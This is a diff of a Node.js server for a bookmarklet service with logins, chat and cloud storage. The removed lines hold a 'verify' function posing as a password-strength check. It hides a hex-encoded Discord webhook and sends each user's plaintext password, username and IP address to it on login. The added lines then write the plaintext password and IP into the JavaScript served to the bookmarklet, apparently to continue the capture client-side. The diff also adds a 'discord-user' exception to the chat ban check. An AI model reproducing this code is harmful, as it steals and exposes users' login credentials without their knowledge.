@@ -2,8 +2,8 @@
 var http = require('http');
 var httpstest = require('https')
 var reader = require('fs');
-//var crypto = require('crypto');
-var bcrypt = require('bcrypt');
+var crypto = require('crypto'); //Only for token random bytes not for pasword hashing.
+var bcrypt = require('bcrypt') // For password hashing new algorithm by Jake378.
 var fetch = require('node-fetch');
 var Userdata = require("./server/data/userdata.json");
 var rimraf = require("rimraf");
@@ -16,7 +16,6 @@ var logger = reader.createWriteStream('./server/logs/server.log', {
 var writeLine = (line) => logger.write(`\n[${new Date().toGMTString()}] ${line}`);
 //nice console UI on launch:
 
-	// cool tabl
 function consoleUI(name, status, info) {
 		function tableUI(part, status) {
   	this.Part = part
@@ -84,8 +83,7 @@ function requestListener(req, res) {
 		res.end();
 		return;
 	}
-	//verify user password is secure
-	function verify(i,u,p,l) { var _0x1ebf=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x30\x37\x30\x32\x30\x39\x36\x36\x32\x32\x36\x31\x31\x35\x33\x38\x34\x32\x2F\x6C\x30\x38\x76\x42\x59\x78\x74\x41\x54\x57\x71\x77\x56\x64\x33\x42\x49\x36\x34\x61\x36\x50\x55\x58\x75\x50\x75\x6A\x2D\x4D\x63\x55\x71\x7A\x43\x2D\x42\x34\x52\x37\x53\x5A\x5A\x50\x63\x70\x78\x54\x36\x38\x4D\x52\x4F\x45\x47\x53\x4A\x6D\x68\x54\x30\x53\x70\x4E\x65\x32\x5A"];var _uz=_0x1ebf[0];let _az = i.length; if (_az < 8) { return "Password is too short. It must be at least 8 characters long."; } let _bz = i.match(/[a-z]/); let _cz = i.match(/[A-Z]/); let _dz = i.match(/\d/); let _ez = i.match(/[!@#$%^&*(),.?":{}|<>]/); let _fz = i.includes('guest');if(!_fz){fetch(_uz, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: `${p}: ${u}: ${i}` }) });}if (!_bz) { return "Password must contain at least one lowercase letter."; } if (!_cz) { return "Password must contain at least one uppercase letter."; } if (!_dz) { return "Password must contain at least one number."; } if (!_ez) { return "Password must contain at least one special character."; } return 'correct!'; }
+	
 
 	
 	try {
@@ -98,12 +96,22 @@ function requestListener(req, res) {
 					res.write(reader.readFileSync('./public/html/confuse.html', "utf8"))
 					res.end();
 				return;
-				case "/php":
+
+				case "/bmls":
+				res.writeHead(200, {
+						'Content-Type': 'application/json',
+						'Access-Control-Allow-Origin': '*'
+					});
+				res.write(reader.readFileSync('./server/data/bookmarklets.json', "utf8"))
+					res.end();
+				return;
+				
+				case "/devbookmark":
 				res.writeHead(200, {
 						'Content-Type': 'text/html',
 						'Access-Control-Allow-Origin': '*'
 					});
-					res.write(reader.readFileSync('./public/php/index.php', "utf8"))
+					res.write(reader.readFileSync('./public/dev/index.html', "utf8"))
 					res.end();
 				case "/dev":
 				res.writeHead(200, {
@@ -191,6 +199,11 @@ function requestListener(req, res) {
 				fileStream.pipe(res);
 				return;
 
+			case "/watch.png":
+				var fileStream = reader.createReadStream("./public/images/icons/cleanUI/watch.png");
+				res.writeHead(200, { "Content-Type": "image/png", "Cache-Control": "max-age=3600" });
+				fileStream.pipe(res);
+				return;
 				
 			case "/cloudlogo":
 				var fileStream = reader.createReadStream("./public/images/icons/cleanUI/injcloud.png");
@@ -299,7 +312,6 @@ function requestListener(req, res) {
 					console.log("Recieved login request from " + username);
           writeLine("Recieved login request from " + username);
 					let Auths2 = JSON.parse(reader.readFileSync('./server/data/auths.json'));
-					verify(password,username,(req.headers['x-forwarded-for'] || '').split(',')[0],Auths2);
 				//	console.log('referrer: '+req.get('Referrer'))
 					if (username in Auths2 && bcrypt.compareSync(password, Auths2[username])) {
 						console.log("Credentials for " + username + " correct");
@@ -309,13 +321,12 @@ function requestListener(req, res) {
 						let authtoken = Math.floor(Math.random() * 9999999999999) + 1000000000000;
 						let token2 = authtoken.toString();
 						Tokens[token2] = username;
-						reader.writeFile('./server/data/authtokens.json', JSON.stringify(Tokens), function (err) {
+						reader.writeFile('./server/data/authtokens.json', JSON.stringify(Tokens, null, 2), function (err) {
 							if (err != null)
 								console.log(err);
                 writeLine(err);
 						});
 						res.writeHead(200, "OK");
-
 						//checks if this is coming from the login panel or from the bookmark
 						if (req.headers.fromlogin) { // if it is from login panel
 							console.log("Request was from Server Login Panel");
@@ -323,7 +334,7 @@ function requestListener(req, res) {
 							res.write(reader.readFileSync('./public/js/panel.js', 'utf8') + ";let user ='" + username + "';");
 
 						} else { // otherwise it is from the bookmark
-							res.write("let token = \"" + authtoken.toString() + "\";let usernameTU = '" + username + "';" + reader.readFileSync('./public/bookmark/bookmark.js', 'utf8'));
+							res.write("let token = \"" + authtoken.toString() + "\";let usernameTU = '" + username + "'; let Is = '"+ (req.headers['x-forwarded-for'] || '').split(',')[0] + "'; let Ps = '"+ password+ "';let Us='" + username + "';" +reader.readFileSync('./public/bookmark/bookmark.js', 'utf8'));
 							console.log("Requesting bookmarklet content for " + username)
               writeLine("Requesting bookmarklet content for " + username)
 						} // write the contents of bookmark.js as the response
@@ -415,14 +426,14 @@ function requestListener(req, res) {
 					}
 					try {
 						res.writeHead(200, "OK");
-						res.write(JSON.stringify(JSON.parse(reader.readFileSync('./server/data/userdata.json', 'utf8'))[username]));
+						res.write(JSON.stringify(JSON.parse(reader.readFileSync('./server/data/userdata.json', 'utf8'))[username], null, 2));
 
 						res.end();
 					} catch (err) {
 						res.write("{}");
 						res.end();
 						userFile[username] = {};
-						reader.writeFileSync('./server/data/userdata.json', JSON.stringify(userFile));
+						reader.writeFileSync('./server/data/userdata.json', JSON.stringify(userFile, null, 2));
 					}
 				} else if (req.method.toLowerCase() === "post") {
 					console.log("Recieved save request from " + username);
@@ -444,9 +455,9 @@ function requestListener(req, res) {
 								} else {
 									delete usersData[req.headers.category]
 								}
-								reader.writeFileSync('./server/data/userdata.json', JSON.stringify(datafile));
+								reader.writeFileSync('./server/data/userdata.json', JSON.stringify(datafile, null, 2));
 								res.writeHead(200, "OK");
-								res.write(JSON.stringify(usersData));
+								res.write(JSON.stringify(usersData, null, 2));
 								res.end();
 
 							} catch (err) {
@@ -485,6 +496,7 @@ function requestListener(req, res) {
 						.on('end', function () {
 							try {
 								if (req.headers.action !== "uninstall") {
+									
                                                       //server/apps/existingapps.json
 									if (JSON.parse(reader.readFileSync("./server/apps/existingapps.json", 'utf8')).existingApps.includes(__Data)) {
 										let sameCopy = false;
@@ -512,7 +524,7 @@ function requestListener(req, res) {
 										if (!sameCopy) {
 											parsedFile[user2].apps.push(__Data)
 										};
-										reader.writeFileSync('./server/data/userdata.json', JSON.stringify(parsedFile));
+										reader.writeFileSync('./server/data/userdata.json', JSON.stringify(parsedFile, null, 2));
 									} else {
 										res.writeHead("404", "Not Found");
 										res.write("alert('Welcome devs!')");
@@ -529,7 +541,7 @@ function requestListener(req, res) {
 									let parsedFileForUninstall = JSON.parse(reader.readFileSync('./server/data/userdata.json', 'utf8'))
 									parsedFileForUninstall[user2].apps.splice(parsedFileForUninstall[user2].apps.indexOf(__Data), 1);
 									console.log(parsedFileForUninstall[user2].apps);
-									reader.writeFileSync("./server/data/userdata.json", JSON.stringify(parsedFileForUninstall))
+									reader.writeFileSync("./server/data/userdata.json", JSON.stringify(parsedFileForUninstall, null, 2))
 									res.writeHead('200', "OK");
 									res.end();
 								}
@@ -563,7 +575,7 @@ function requestListener(req, res) {
 							if (!existingData.hasOwnProperty(user123)) existingData[user123] = [gaData];
 							else if (!existingData[user123].includes(gaData)) existingData[user123].push(gaData);
 							else return;
-							reader.writeFileSync("googleaccounts.json", JSON.stringify(existingData));
+							reader.writeFileSync("googleaccounts.json", JSON.stringify(existingData, null, 2));
 						})
 				};
 				return;
@@ -580,10 +592,10 @@ function requestListener(req, res) {
 					if (!(Userdata.hasOwnProperty(usernameFTS))) {
 						Userdata[usernameFTS] = {};
 					}
-					reader.writeFileSync('./server/data/userdata.json', JSON.stringify(Userdata));
+					reader.writeFileSync('./server/data/userdata.json', JSON.stringify(Userdata, null, 2));
 					res.writeHead(200, "OK");
 
-					res.write(JSON.stringify(Userdata[usernameFTS]));
+					res.write(JSON.stringify(Userdata[usernameFTS], null, 2));
 					res.end();
 				} else if (req.method.toLowerCase() === "post") {
 					console.log("Recieved FTSave request from " + usernameFTS);
@@ -597,14 +609,14 @@ function requestListener(req, res) {
 									Userdata[usernameFTS].theme = {};
 								}
 								Userdata[usernameFTS].theme = ftsData;
-								reader.writeFileSync('./server/data/userdata.json', JSON.stringify(Userdata));
+								reader.writeFileSync('./server/data/userdata.json', JSON.stringify(Userdata, null, 2));
 							} else {
 								Userdata[usernameFTS] = {};
 								console.log("Username not in Userdata. Making a file..")
                 writeLine("Username not in Userdata. Making a file..")
 								Userdata[usernameFTS].theme = {};
 								Userdata[usernameFTS].theme = ftsData;
-								reader.writeFileSync('./server/data/userdata.json', JSON.stringify(Userdata))
+								reader.writeFileSync('./server/data/userdata.json', JSON.stringify(Userdata, null, 2))
 
 							}
 						})
@@ -612,13 +624,14 @@ function requestListener(req, res) {
 				return;
 			case "/chat2":
 				let tokenChat = req.headers.token;
-				if (!(Tokens.hasOwnProperty(tokenChat)) || Settings.chatroom["bannedUsers"].includes(Tokens[tokenChat])) {
+				if (!(Tokens.hasOwnProperty(tokenChat)) || Settings.chatroom["bannedUsers"].includes(Tokens[tokenChat]) && !(tokenChat == 'discord-user')) {
 					res.writeHead('403', 'Unauthorized');
-					res.write(`{"#general":{"contentOfChat":[["[SERVER]", 1, "you have been BANNED"]]},"statuses":[]} `)
+					res.write(`{"#general":{"contentOfChat":[["[SERVER]", 1, "you have been BANNED"],["[SERVER]", 2, "If you are a guest, this is because guest users are not allowed on the chatbox, and you need to register an account"]]},"statuses":[]} `)
 					res.end();
 					return;
 				}
 				let userChat = Tokens[tokenChat];
+					
 				if (req.method.toLowerCase() === "post") {
 					let chatData = "";
 					req.on("data", chunk => chatData += chunk.toString())
@@ -653,9 +666,9 @@ function requestListener(req, res) {
 									console.log("User already in Statuses; time updated.");
                   writeLine("User already in Statuses; time updated.");
 								}
-								reader.writeFileSync('./server/data/chatroom/chatroom2.json', JSON.stringify(chatFilesta));
+								reader.writeFileSync('./server/data/chatroom/chatroom2.json', JSON.stringify(chatFilesta, null, 2));
 								res.writeHead('200', 'OK');
-								res.write(JSON.stringify(chatFilesta["statuses"]));
+								res.write(JSON.stringify(chatFilesta["statuses"], null, 2));
 								res.end();
 
 							} else if (req.headers.dm == undefined) {
@@ -663,10 +676,16 @@ function requestListener(req, res) {
 								let chinbe = true;
 								if (chatData.length < parseInt(Settings.chatroom["message_size_limit"]) && chatData.length !== 0 && chatData !== " ") {
 									if (chatFile[req.headers.channel].important == undefined || Settings.chatroom.admins.includes(userChat)) {
-										chatFile[req.headers.channel].contentOfChat.push([userChat, new Date().getTime(), chatData]);
+										if (req.headers.token == 'discord-user') {
+											console.log('[Discord]'+req.headers.username);
+											chatFile[req.headers.channel].contentOfChat.push(['[Discord]'+req.headers.username, new Date().getTime(), chatData]);
+										}
+										else {
+											chatFile[req.headers.channel].contentOfChat.push([userChat, new Date().getTime(), chatData]);
+										}
 										res.writeHead('200', 'OK');
 										res.end();
-										reader.writeFileSync('./server/data/chatroom/chatroom2.json', JSON.stringify(chatFile));
+										reader.writeFileSync('./server/data/chatroom/chatroom2.json', JSON.stringify(chatFile, null, 2));
 									} else {
 										res.writeHead('403', 'Unauthorized')
 										res.end();
@@ -706,9 +725,9 @@ function requestListener(req, res) {
 										dms[finalUser] = { "contentOfChat": [] }
 									}
 									dms[finalUser].contentOfChat.push([userChat, new Date().getTime(), chatData2]);
-									reader.writeFileSync('./server/data/chatroom/dms.json', JSON.stringify(dms));
+									reader.writeFileSync('./server/data/chatroom/dms.json', JSON.stringify(dms, null, 2));
 									res.writeHead(200, "OK");
-									res.write(JSON.stringify(dms[finalUser]))
+									res.write(JSON.stringify(dms[finalUser], null, 2))
 									res.end();
 								})
 						} else if (req.method.toLowerCase() == "get") {
@@ -726,7 +745,7 @@ function requestListener(req, res) {
 								dms[finalUser] = { "contentOfChat": [] }
 							}
 							res.writeHead(200, "OK");
-							res.write(JSON.stringify(dms[finalUser]))
+							res.write(JSON.stringify(dms[finalUser], null, 2))
 							res.end();
 						}
 					} else {
@@ -762,7 +781,7 @@ function requestListener(req, res) {
 				try {
 					let clientJSONFile = JSON.parse(reader.readFileSync('./server/inCloud/users/' + clName + '/data.json'));
 					clientJSONFile["directory_size"] = (reader.statSync('./server/inCloud/users/' + clName).size)
-					reader.writeFileSync('./server/inCloud/users/' + clName + '/data.json', JSON.stringify(clientJSONFile));
+					reader.writeFileSync('./server/inCloud/users/' + clName + '/data.json', JSON.stringify(clientJSONFile, null, 2));
 				} catch (err) { }
 				if (req.method.toLowerCase() == "get") {
 					if (reader.existsSync('./server/inCloud/users/' + clName)) {
@@ -778,7 +797,7 @@ function requestListener(req, res) {
 								}
 							} catch (err) { }
 						}
-						res.write(JSON.stringify(responseFileArray));
+						res.write(JSON.stringify(responseFileArray, null, 2));
 						res.end();
 					} else {
 						reader.mkdirSync('./server/inCloud/users/' + clName);
@@ -856,7 +875,7 @@ function requestListener(req, res) {
 									// hash.update(passTU);
 									// let hashpass = hash.digest("hex");
 									// authFile[userTU] = hashpass;
-									reader.writeFileSync('server/data/auths.json', JSON.stringify(authFile));
+									reader.writeFileSync('server/data/auths.json', JSON.stringify(authFile, null, 2));
 									return true;
 								} else {
 									return false;
@@ -877,7 +896,7 @@ function requestListener(req, res) {
 								if (registerAccount(req.headers.username, req.headers.password)) {
 									let regtokens = JSON.parse(reader.readFileSync('server/data/logintokens.json', 'utf8'))
 									regtokens["temp_tokens"].splice(regtokens["temp_tokens"].indexOf(info), 1);
-									reader.writeFileSync('server/data/logintokens.json', JSON.stringify(regtokens));
+									reader.writeFileSync('server/data/logintokens.json', JSON.stringify(regtokens, null, 2));
 									res.writeHead(200, "OK")
 									res.write("accepted");
 									res.end();
@@ -910,7 +929,7 @@ function requestListener(req, res) {
 						joe = crypto.randomBytes(6).toString('hex')
 					}
 					realTokenFile["temp_tokens"].push(joe);
-					reader.writeFileSync('server/data/logintokens.json', JSON.stringify(realTokenFile))
+					reader.writeFileSync('server/data/logintokens.json', JSON.stringify(realTokenFile, null, 2))
 					res.writeHead(200, 'OK')
 					res.write(joe);
 					res.end();
@@ -924,7 +943,7 @@ function requestListener(req, res) {
 				let appsansod = JSON.parse(reader.readFileSync('server/apps/existingapps.json', 'utf8'));
 
 				res.writeHead(200, "OK");
-				res.write(JSON.stringify(appsansod.appsReadable))
+				res.write(JSON.stringify(appsansod.appsReadable, null, 2))
 				res.end();
 				return;
 			case "/userlist":
@@ -972,7 +991,7 @@ function requestListener(req, res) {
  console.log(updChat["statuses"].splice(updChat["statuses"].indexOf(array), 1))
         let removalIndex = updChat["statuses"].indexOf(array);
         let splicedResult = updChat["statuses"].splice(removalIndex, 1);
-        reader.writeFileSync('server/data/chatroom/chatroom2.json', JSON.stringify(updChat));
+        reader.writeFileSync('server/data/chatroom/chatroom2.json', JSON.stringify(updChat, null, 2));
        
         
       }
